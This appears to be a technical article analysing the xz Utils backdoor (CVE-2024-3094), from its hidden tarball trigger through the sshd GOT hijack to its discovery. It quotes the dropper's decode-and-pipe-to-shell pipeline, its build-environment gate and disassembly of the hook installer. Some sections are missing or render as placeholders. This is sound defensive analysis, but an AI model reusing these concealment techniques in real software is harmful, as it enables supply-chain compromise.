On March 29, 2024 at 15:51 UTC, Andres Freund posted to *oss-security*. Subject: *backdoor in upstream xz/liblzma leading to ssh server compromise*. Within hours, Debian rolled sid back to a pre-5.6 xz, Red Hat pulled Fedora 40 Beta and Rawhide, GitHub disabled the upstream `tukaani-project` organization, and <Term slug="cve">CVE-2024-3094</Term> was assigned the maximum <Term slug="cvss">CVSS</Term> score of 10.0.

What had almost shipped - to Debian, Fedora, Kali, openSUSE - was a pre-authentication remote-code-execution backdoor in <Term slug="sshd">`sshd`</Term>, the SSH daemon every public Linux server runs. The backdoor was hidden inside <Term slug="liblzma">`liblzma`</Term>, xz Utils' compression library. Upstream, the two have no dependency on each other. The attack threaded that gap with two years of accumulated maintainer trust, a shell snippet wedged into an autoconf macro, and an <Term slug="ifunc">IFUNC</Term> resolver that fired before the dynamic linker locked the <Term slug="got">GOT</Term>.

Five acts: the arrival, the trigger, the payload, the hijack, the discovery.

## Act II - The Trigger

Two artifacts ship with an xz release: the *git tag* (the source committed to the repository) and the *release tarball* (the same source plus `configure` scripts and `m4` macros generated by autoconf). The second is rarely audited - it's machine-generated, often by a bot. xz-5.6.1's tarball contained an `m4/build-to-host.m4` that didn't exist in git, masquerading as the gnulib (GNU's macro library) version it claimed to be.

<TarballDiff />

The file is named after a stock gnulib macro, but the content diverges from the upstream [gnulib version](https://git.savannah.gnu.org/gitweb/?p=gnulib.git;a=blob_plain;f=m4/build-to-host.m4) it claims to be. Three additions carry the entire trigger (cosmetic and trailing-convenience-block changes elided):

## Act III - The Payload

The dropper has three constraints: each layer innocuous in isolation, no <Term slug="elf">ELF</Term> at rest in any repository or tarball, silent failure outside real package builds. What ships in the tarball is the m4 diff above plus two binary "test fixtures" - `bad-3-corrupt_lzma2.xz` (512 B, sha-256 `ecda10d8…16bd`) and `good-large_compressed.lzma` (35 KB, sha-256 `9aef8982…7032`). Together they unfold into a Linux ELF object: `liblzma_la-crc64-fast.o`. The walk below cross-references [Russ Cox's xz-script analysis](https://research.swtch.com/xz-script).

### Stage 1 - the shell script that comes out

The m4-flow above produces a 1.3 KB shell script - Stage-1. It doesn't do anything dangerous itself; its only job is to extract the next layer from the *other* test fixture, `good-large_compressed.lzma`.

### Stage 2 - the chunker

Stage-1 runs this pipeline:

```bash title="Stage-1.sh - extracting the payload from good-large_compressed.lzma" frame="code"
xz -dc good-large_compressed.lzma \
  | <head-chunker> \
  | tail -c +31233 \
  | tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" \
  | xz -F raw --lzma1 -dc \
  | /bin/sh
```

The `<head-chunker>` is 16 repetitions of `(head -c +1024 >/dev/null) && head -c +2048`, then one `(head -c +1024 >/dev/null) && head -c +939` - i.e. skip 1024, take 2048, sixteen times, then skip 1024 and take 939. The `tr` table that follows is a byte permutation: each of the 256 possible byte values maps to a different byte. The byte counts at each step:

### Stage 3 - the .o lands

Stage-2 gates aggressively before doing anything dangerous. Each check below is "if this looks wrong, exit silently - no error, no message, no trace":

```bash title="Stage-2.sh - the build-environment gate (condensed)" frame="code"
[ "$(uname)" != "Linux" ]                                  && exit 0   # not Linux
echo "$build" | grep -Eq "^x86_64.*linux-gnu$"             || exit 0   # not x86_64 Linux ABI
[ "$CC" = "gcc" ] && [ "$GCC" = "yes" ]                    || exit 0   # not gcc
$LD -v 2>&1 | grep -q "GNU ld"                             || exit 0   # not GNU ld
[ "$enable_shared" = "yes" ]                               || exit 0   # not building a shared library
test -f "$srcdir/debian/rules" || [ "$RPM_ARCH" = "x86_64" ] || exit 0  # not a Debian or x86_64 RPM build
grep -q 'HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h             || exit 0   # IFUNC support not detected
```

The dropper fires only inside a real x86_64 Linux distro packaging job. Anything else - CI sandboxes running `./configure` for static analysis, fuzzers, build environments outside Debian or RPM packaging - exits silently with no output and no trace. Documented in [Sam James's canonical FAQ](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27).

On a successful gate, the script patches libtool to drop the `-fPIC -DPIC` constraint, re-runs the chunker against `good-large_compressed.lzma` with different offsets to extract the actual ELF, and writes it as `liblzma_la-crc64-fast.o` in the build tree. The configure machinery treats it as a normal CRC64 implementation. Linked into `liblzma.so.5`, it ships with the next package upgrade.

### What landed

The .o is small - 88,664 bytes - but ships **242 section headers** (`e_shnum = 0xF2` at file offset `0x3C`). The high count is a side-effect of compiler flags Stage-2 sets explicitly: `-ffunction-sections -fdata-sections`, so every function and every data object lands in its own `.text.<name>` or `.data.<name>` section. The fragmentation buries the typo-symbols in a long, plausible-looking section list. The three that matter, per [smx-smx/xzre](https://github.com/smx-smx/xzre)'s reverse engineering: `_get_cpuid` (the IFUNC entry), `_cpuid` (a CPUID-feature helper), and an opaque ~2.7 KB blob `.Lx86_code.part.0` that holds the runtime payload.

Linked into `liblzma.so.5`, the .o ships as part of a signed, hash-verified, reproducibly-built Debian or Fedora package. Every distro security check passes - each one verifies the binary as built, and the binary as built includes the backdoor.

## Act IV - The Hijack

Three Linux primitives carry the runtime hijack:

- <Term slug="ifunc">**IFUNC**</Term> - *indirect functions*: a way for a library to pick the right implementation of a function at startup (e.g., a <Term slug="clmul">CLMUL</Term>-accelerated CRC64 on capable CPUs, a table-lookup fallback elsewhere).
- <Term slug="got">**GOT**</Term> - *Global Offset Table*: a small in-memory table the dynamic linker fills with function addresses so the program can call functions in shared libraries.
- <Term slug="plt">**PLT**</Term> - *Procedure Linkage Table*: the per-call-site stub that dispatches through a GOT slot. sshd's `RSA_public_decrypt` call site never moves; it always indirects through one GOT entry, so rewriting that one entry redirects every call sshd ever makes.
- <Term slug="relro">**RELRO**</Term> - *RELocation Read-Only*: after the linker finishes resolving symbols, it `mprotect`s the GOT read-only so nothing can rewrite those addresses at runtime.

Plus a downstream patch to OpenSSH that brings `liblzma` into `sshd`'s address space in the first place.

### The path

Upstream OpenSSH doesn't link <Term slug="libsystemd">`libsystemd`</Term>. Most systemd distributions patch sshd to call <Term slug="sd-notify">`sd_notify()`</Term> so the service manager knows when sshd is ready; that patch pulls `libsystemd.so.0` into the process, which in turn pulls `liblzma.so.5` for journal compression. `ldd` makes the chain explicit:

```bash title="ldd /usr/sbin/sshd  ·  Debian sid (excerpt)" frame="code"
linux-vdso.so.1 (0x00007ffd…)
libcrypto.so.3      => /lib/x86_64-linux-gnu/libcrypto.so.3
libsystemd.so.0     => /lib/x86_64-linux-gnu/libsystemd.so.0   # via downstream sd_notify patch
libz.so.1           => /lib/x86_64-linux-gnu/libz.so.1
libpam.so.0         => /lib/x86_64-linux-gnu/libpam.so.0
…
liblzma.so.5        => /lib/x86_64-linux-gnu/liblzma.so.5      # transitive - pulled by libsystemd
```

That chain is the precondition for everything that follows. Every dynamically-loaded library shares its host's virtual address space - there is no privilege boundary between sshd and any library <Term slug="ld-so">`ld.so`</Term> resolves into it. Once `liblzma.so.5` is mapped, code in liblzma can read or write any memory in sshd: GOT entries, function pointers, keys in flight. And sshd runs as root, so code execution inside the process is remote root. The path through `libsystemd` is an audit blind spot: OpenSSH upstream is heavily reviewed, but its maintainers don't audit transitive dependencies pulled in by downstream packaging patches.

All of this fires *before any client connects*. The IFUNC resolvers in `liblzma` run during `ld.so` setup, while sshd is starting - not when a connection arrives. By the time a packet hits the port, the GOT has already been rewritten.

### IFUNC, before RELRO

When the linker resolves an <Term slug="ifunc">IFUNC</Term> symbol - one tagged with GCC's `__attribute__((ifunc("...")))` - it invokes a *resolver* function during process startup and uses whatever pointer the resolver returns as the symbol's implementation. xz already shipped one of these for CRC64: capable CPUs got a `pclmulqdq`-accelerated path, older CPUs got a table-lookup fallback, and the legitimate resolver picked between them at load time. The backdoor doesn't introduce IFUNC into a place that didn't have it - it sits inside the dispatch xz was already exporting, inside the file that legitimately compiles to `liblzma_la-crc64-fast.o`.

The mechanism runs early in `ld.so` setup, *before* <Term slug="relro">RELRO</Term> makes the GOT read-only. Inside that window the GOT is still writable, and a resolver can write anywhere in the process - including GOT entries it has no business touching. This is true under both partial and full RELRO: glibc invokes IFUNC resolvers in `_dl_relocate_object` *before* the final `mprotect(PROT_READ)` runs, so the hardening that was supposed to block exactly this kind of GOT rewrite never fires in time.

### The resolver - installing the hook

`_get_cpuid` is the function that **installs the hook**. Glibc's IFUNC machinery calls it once during `ld.so` setup (because liblzma's CRC64 export is declared as `__attribute__((ifunc("_get_cpuid")))`). To glibc, it's just an ordinary IFUNC resolver returning a CPUID-features struct. To the attacker, the *side effect* of running it is the entire setup of the backdoor.

The first eleven lines of disassembly are a standard function prologue - <Term slug="endbr64">`endbr64`</Term> (<Term slug="cet-ibt">Intel CET</Term> IBT landing pad, required at every indirect-call target on CET-enabled binaries), frame-pointer and callee-saved register saves, the six SysV-ABI argument registers spilled to the stack - exactly what GCC emits for any C function. Then a single <Mnemonic op="callq">callq</Mnemonic> at offset `0x27`. After that call returns, the function tests its result and finishes by returning valid CPUID data, so glibc's IFUNC machinery is satisfied:

```asm title="liblzma_la-crc64-fast.o · _get_cpuid · AT&T syntax" frame="code"
0000000000000000 <_get_cpuid>:
       0: f3 0f 1e fa                   endbr64
       4: 55                            pushq   %rbp
       5: 48 89 f5                      movq    %rsi, %rbp
       8: 4c 89 ce                      movq    %r9, %rsi
       b: 53                            pushq   %rbx
       c: 89 fb                         movl    %edi, %ebx
       e: 81 e7 00 00 00 80             andl    $0x80000000, %edi
      14: 48 83 ec 28                   subq    $0x28, %rsp
      18: 48 89 54 24 18                movq    %rdx, 0x18(%rsp)
      1d: 48 89 4c 24 10                movq    %rcx, 0x10(%rsp)
      22: 4c 89 44 24 08                movq    %r8, 0x8(%rsp)
      27: e8 00 00 00 00                callq   0x2c <_get_cpuid+0x2c>
      2c: 85 c0                         testl   %eax, %eax
      2e: 74 27                         je      0x57 <_get_cpuid+0x57>
```

Read literally, the call lands at `0x2c` - the very next instruction. That's a quirk of disassembling an *unlinked* object: the four bytes after the `e8` opcode are placeholder zeros, and the real target lives in a relocation entry attached to that instruction:

```text title="objdump -dr - the relocation on the callq"
0000000000000028:  R_X86_64_PC32   .text._get_cpuia-0x4
```

`R_X86_64_PC32` is a 32-bit PC-relative relocation. At link time the linker writes those four bytes as `S + A − P`, where `S` is the resolved address of `_get_cpuia`, `A = −4` accounts for the displacement field's own size, and `P` is the address of the field itself. Until that write happens, the disassembler sees zeros and renders the misleading `+0x2c` fall-through.

After linking, the call jumps to a function called **`_get_cpuia`** - note the deliberate typo, ending in `a` instead of `d`. In the symbol table it sits right next to `_get_cpuid` and looks like more CPUID machinery. It isn't. `_get_cpuia` is the function that installs the hook. As a control-flow graph:

<InstallCfg />

It walks <Term slug="r-debug">`_r_debug`</Term> - the dynamic linker's doubly-linked list of <Term slug="link-map">`link_map`</Term> entries, one per loaded shared object - until it finds sshd's `link_map`. From there it parses sshd's <Term slug="dynsym">`.dynsym`</Term> to resolve <Term slug="rsa-public-decrypt">`RSA_public_decrypt`</Term>, computes the address of sshd's GOT slot for that symbol, and - because RELRO hasn't fired yet - overwrites the slot with a `movq`. The walk is the interesting part; the write itself is one instruction. The opaque ~2.7 KB blob `.Lx86_code.part.0` (in a separate section) holds the shared data and code the malicious functions reuse, including `match_sshd` and `walk_dynsym` referenced in the graph above.

The same lookalike-symbol trick is used throughout the .o: `.text.x86_codd` (ends in `d-d`, not `d-e`), `.text.lzma_raw_coder_memusaga` ("memusaga" close to `memusage`), `.text.lzma2_encoder_inia` ("inia" close to `init`). Casual symbol-table review slides right past them.

At the disassembly level the resolver is indistinguishable from a benign IFUNC. Only that one `callq` is the attack - and only the relocation entry reveals where it actually goes. By the time `_get_cpuid` returns to glibc's IFUNC machinery, the GOT entry has been rewritten; RELRO is about to lock the table read-only with the rewrite frozen in place.

### The hook - at request time

On-disk symbols are deliberately scrambled. Runtime names - `_resolve`, the imported `RSA_public_decrypt` - are looked up by hash against the `link_map` walk above; nothing in the .o references them statically, so a string scan against the binary finds nothing useful. [smx-smx/xzre](https://github.com/smx-smx/xzre) reverses the runtime payload in detail.

### The gate

The signature scheme is <Term slug="ed448">Ed448</Term>, not Ed25519 - EdDSA over Curve448, providing roughly 224-bit security. [amlweems/xzbot](https://github.com/amlweems/xzbot) confirmed it with a working proof-of-concept, extracting the attacker's embedded Ed448 public key and shipping a honeypot patch for OpenSSH. Without the matching private key, even a connection that knows the modulus layout produces no system call. The signature gate keeps blast radius to whoever holds the private key, and stops opportunistic abuse the moment the binary ships.

Between the binary shipping and any operator using it, what caught the backdoor wasn't cryptanalysis. It was a 500-millisecond latency spike on ssh logins.

## Act V - The Discovery

In Andres Freund's own words: *"a few odd symptoms around liblzma … on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors)."* He measured it directly - a clean `sshd -h` took `0m0.299s`; the same call against a backdoored `liblzma` took `0m0.807s`.

He chased it with the tools he names in the disclosure: `valgrind` (a memory-error detector) for the bad reads and writes; then `perf record -e intel_pt//ub` (Intel Processor Trace, which records every instruction the CPU executes) to find where the slow run diverged from a clean baseline; then `gdb` (the GNU debugger) with breakpoints just before that divergence. Once execution led into liblzma's CRC64 path - which sshd has no upstream reason to call - he traced the call chain to the redirected `RSA_public_decrypt` and recognized the hook.

At 15:51 UTC on March 29, 2024, he posted to *oss-security*:

> After observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors) I figured out the answer: The upstream xz repository and the xz tarballs have been backdoored. - Andres Freund, [oss-security 2024/03/29/4 ↗](https://www.openwall.com/lists/oss-security/2024/03/29/4)

## Aftermath

Within seven days of Andres's email, every affected distribution shipped a rollback: Debian rolled sid back to a pre-5.6 xz; Red Hat pulled Fedora 40 Beta and Rawhide; openSUSE, Arch, and Kali pulled or downgraded; Homebrew downgraded xz on macOS as a precaution. GitHub disabled the `tukaani-project` organization for several days, then re-enabled it under Lasse Collin's sole control. Lasse published a maintainer's statement at [tukaani.org/xz-backdoor](https://tukaani.org/xz-backdoor/).

<DistroGrid />

The vulnerable releases reached rolling and pre-release distributions only. Stable lines - Debian stable, Ubuntu LTS, RHEL, Amazon Linux - were still on pre-5.6 versions and were never exposed.

### What this attack proved

1. **Pre-RELRO IFUNC resolution is a writable-GOT window.** Any shared library loaded into `sshd`'s address space - even through an indirect chain like `sshd → libsystemd → liblzma` - can rewrite `sshd`'s function pointers from its own startup code, before `ld.so` marks the GOT read-only.
2. **A single-maintainer open-source project is a trust graph that can be slowly taken over.** Two years of contributions, sock-puppet pressure, and incremental role expansion put hostile bytes into a library every Linux distro ships.
3. **A 500 ms latency anomaly was the only signal that fired.** No fuzzer, no SBOM check, no reproducible-build audit caught it. A developer noticed `sshd` was slow, and chased it.

### Sock-puppet coordination

The pressure emails came from accounts (*Jigar Kumar*, *Dennis Ens*) with zero public footprint anywhere else online. Their timing aligned with what Jia Tan needed at each step. Whether one operator using two emails or two coordinated operators isn't known from the public record. Either way, almost certainly the same operation.

### What we don't know

Patience (≥2 years), budget to keep an identity active that long, and the sophistication of the runtime payload all point to a state-aligned actor - not a freelancer, not a criminal group. Public attribution remains speculative: no government has named a suspect; no suspect has been arrested. Treat any specific naming you see online as unverified.
